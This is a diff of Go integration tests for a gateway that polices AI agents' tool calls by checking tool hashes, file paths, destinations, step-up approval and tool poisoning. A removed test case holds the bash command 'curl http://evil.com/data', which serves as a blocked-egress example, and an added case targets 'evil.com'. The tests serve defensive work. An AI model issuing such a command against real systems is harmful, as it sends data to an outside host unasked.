@@ -5,6 +5,7 @@ package integration
 import (
 	"bytes"
 	"encoding/json"
+	"io"
 	"net/http"
 	"testing"
 	"time"
@@ -28,7 +29,7 @@ func TestToolHashVerification(t *testing.T) {
 		{
 			name:        "ValidHashAllowed",
 			tool:        "read",
-			toolHash:    "a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3",
+			toolHash:    "c4fbe869591f047985cd812915ed87d2c9c77de445089dcbc507416a86491453",
 			spiffeID:    "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev",
 			wantAllowed: true,
 			wantReason:  "",
@@ -63,7 +64,7 @@ func TestToolHashVerification(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			// Create MCP request with tool hash
 			params := map[string]interface{}{
-				"file_path": pocDir() + "/README.md",
+				"file_path": "/app/gateway",
 			}
 			if tt.toolHash != "" {
 				params["tool_hash"] = tt.toolHash
@@ -91,17 +92,18 @@ func TestToolHashVerification(t *testing.T) {
 				t.Fatalf("Request failed: %v", err)
 			}
 			defer resp.Body.Close()
+			respBody, _ := io.ReadAll(resp.Body)
 
 			// Verify result
 			if tt.wantAllowed {
 				// Allowed requests should pass through (may get 502 if upstream unavailable)
 				if resp.StatusCode == http.StatusForbidden {
-					t.Errorf("Expected allowed request, got 403")
+					t.Errorf("Expected allowed request, got 403 body=%s", string(respBody))
 				}
 			} else {
 				// Denied requests should get 403
 				if resp.StatusCode != http.StatusForbidden {
-					t.Errorf("Expected 403 for denied request, got %d", resp.StatusCode)
+					t.Errorf("Expected 403 for denied request, got %d body=%s", resp.StatusCode, string(respBody))
 				}
 			}
 		})
@@ -114,9 +116,6 @@ func TestPathBasedRestrictions(t *testing.T) {
 	if err := waitForService(gatewayURL+"/health", 30*time.Second); err != nil {
 		t.Fatalf("Gateway not ready: %v", err)
 	}
-	if err := waitForService(opaURL+"/health", 30*time.Second); err != nil {
-		t.Fatalf("OPA not ready: %v", err)
-	}
 
 	tests := []struct {
 		name        string
@@ -127,9 +126,9 @@ func TestPathBasedRestrictions(t *testing.T) {
 		wantReason  string
 	}{
 		{
-			name:        "AllowedPathInPOC",
+			name:        "AllowedPathInRuntime",
 			tool:        "read",
-			path:        pocDir() + "/README.md",
+			path:        "/app/gateway",
 			spiffeID:    "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev",
 			wantAllowed: true,
 			wantReason:  "",
@@ -143,9 +142,9 @@ func TestPathBasedRestrictions(t *testing.T) {
 			wantReason:  "path_denied",
 		},
 		{
-			name:        "GrepAllowedInPOC",
+			name:        "GrepAllowedInRuntime",
 			tool:        "grep",
-			path:        pocDir(),
+			path:        "/app",
 			spiffeID:    "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev",
 			wantAllowed: true,
 			wantReason:  "",
@@ -193,15 +192,16 @@ func TestPathBasedRestrictions(t *testing.T) {
 				t.Fatalf("Request failed: %v", err)
 			}
 			defer resp.Body.Close()
+			respBody, _ := io.ReadAll(resp.Body)
 
 			// Verify result
 			if tt.wantAllowed {
 				if resp.StatusCode == http.StatusForbidden {
-					t.Errorf("Expected allowed request, got 403")
+					t.Errorf("Expected allowed request, got 403 body=%s", string(respBody))
 				}
 			} else {
 				if resp.StatusCode != http.StatusForbidden {
-					t.Errorf("Expected 403 for denied request, got %d", resp.StatusCode)
+					t.Errorf("Expected 403 for denied request, got %d body=%s", resp.StatusCode, string(respBody))
 				}
 			}
 		})
@@ -213,9 +213,6 @@ func TestDestinationRestrictions(t *testing.T) {
 	// Wait for services
 	if err := waitForService(gatewayURL+"/health", 30*time.Second); err != nil {
 		t.Fatalf("Gateway not ready: %v", err)
-	}
-	if err := waitForService(opaURL+"/health", 30*time.Second); err != nil {
-		t.Fatalf("OPA not ready: %v", err)
 	}
 
 	tests := []struct {
@@ -229,21 +226,21 @@ func TestDestinationRestrictions(t *testing.T) {
 		{
 			name:     "TavilyAllowedToDomain",
 			tool:     "tavily_search",
-			params:   map[string]interface{}{"query": "test"},
+			params:   map[string]interface{}{"query": "test", "destination": "api.tavily.com"},
 			spiffeID: "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev",
-			// Tavily researcher does not have tavily_search in allowed_tools, so it should be denied
-			wantAllowed: false,
-			wantReason:  "tool_not_authorized",
+			wantAllowed: true,
+			wantReason:  "",
 		},
 		{
-			name: "BashDeniedExternalEgress",
-			tool: "bash",
+			name: "TavilyDeniedExternalDestination",
+			tool: "tavily_search",
 			params: map[string]interface{}{
-				"command": "curl http://evil.com/data",
+				"query":       "test",
+				"destination": "evil.com",
 			},
 			spiffeID:    "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev",
 			wantAllowed: false,
-			wantReason:  "tool_not_authorized", // bash not in researcher's allowed tools
+			wantReason:  "stepup_destination_blocked",
 		},
 	}
 
@@ -272,15 +269,16 @@ func TestDestinationRestrictions(t *testing.T) {
 				t.Fatalf("Request failed: %v", err)
 			}
 			defer resp.Body.Close()
+			respBody, _ := io.ReadAll(resp.Body)
 
 			// Verify result
 			if tt.wantAllowed {
 				if resp.StatusCode == http.StatusForbidden {
-					t.Errorf("Expected allowed request, got 403")
+					t.Errorf("Expected allowed request, got 403 body=%s", string(respBody))
 				}
 			} else {
 				if resp.StatusCode != http.StatusForbidden {
-					t.Errorf("Expected 403 for denied request, got %d", resp.StatusCode)
+					t.Errorf("Expected 403 for denied request, got %d body=%s", resp.StatusCode, string(respBody))
 				}
 			}
 		})
@@ -292,9 +290,6 @@ func TestStepUpGating(t *testing.T) {
 	// Wait for services
 	if err := waitForService(gatewayURL+"/health", 30*time.Second); err != nil {
 		t.Fatalf("Gateway not ready: %v", err)
-	}
-	if err := waitForService(opaURL+"/health", 30*time.Second); err != nil {
-		t.Fatalf("OPA not ready: %v", err)
 	}
 
 	// Note: bash is not in researcher's allowed_tools, so we use gateway SPIFFE ID which has "*" access
@@ -322,13 +317,13 @@ func TestStepUpGating(t *testing.T) {
 			params:      map[string]interface{}{"command": "ls"},
 			spiffeID:    "spiffe://poc.local/gateways/mcp-security-gateway/dev",
 			stepUpToken: "valid-step-up-token-12345",
-			wantAllowed: true,
-			wantReason:  "",
+			wantAllowed: false,
+			wantReason:  "stepup_approval_required",
 		},
 		{
 			name:        "ReadNoStepUpRequired",
 			tool:        "read",
-			params:      map[string]interface{}{"file_path": pocDir() + "/README.md"},
+			params:      map[string]interface{}{"file_path": "/app/gateway"},
 			spiffeID:    "spiffe://poc.local/agents/mcp-client/dspy-researcher/dev",
 			stepUpToken: "",
 			wantAllowed: true,
@@ -364,15 +359,16 @@ func TestStepUpGating(t *testing.T) {
 				t.Fatalf("Request failed: %v", err)
 			}
 			defer resp.Body.Close()
+			respBody, _ := io.ReadAll(resp.Body)
 
 			// Verify result
 			if tt.wantAllowed {
 				if resp.StatusCode == http.StatusForbidden {
-					t.Errorf("Expected allowed request, got 403")
+					t.Errorf("Expected allowed request, got 403 body=%s", string(respBody))
 				}
 			} else {
 				if resp.StatusCode != http.StatusForbidden {
-					t.Errorf("Expected 403 for denied request, got %d", resp.StatusCode)
+					t.Errorf("Expected 403 for denied request, got %d body=%s", resp.StatusCode, string(respBody))
 				}
 			}
 		})
@@ -439,7 +435,7 @@ func TestPoisoningPatternDetection(t *testing.T) {
 				"jsonrpc": "2.0",
 				"method":  tt.toolName,
 				"params": map[string]interface{}{
-					"file_path": pocDir() + "/README.md",
+					"file_path": "/app/gateway",
 				},
 				"id": 1,
 			}
@@ -459,17 +455,18 @@ func TestPoisoningPatternDetection(t *testing.T) {
 				t.Fatalf("Request failed: %v", err)
 			}
 			defer resp.Body.Close()
+			respBody, _ := io.ReadAll(resp.Body)
 
 			// Verify result
 			if tt.wantBlocked {
 				// Poisoned tools should be blocked with 403
 				if resp.StatusCode != http.StatusForbidden {
-					t.Errorf("Expected 403 for poisoned tool, got %d. Reason: %s", resp.StatusCode, tt.reason)
+					t.Errorf("Expected 403 for poisoned tool, got %d body=%s. Reason: %s", resp.StatusCode, string(respBody), tt.reason)
 				}
 			} else {
 				// Clean tools should pass through (may get 502 if upstream unavailable)
 				if resp.StatusCode == http.StatusForbidden {
-					t.Errorf("Expected clean tool to be allowed, got 403. Reason: %s", tt.reason)
+					t.Errorf("Expected clean tool to be allowed, got 403 body=%s. Reason: %s", string(respBody), tt.reason)
 				}
 			}
 		})
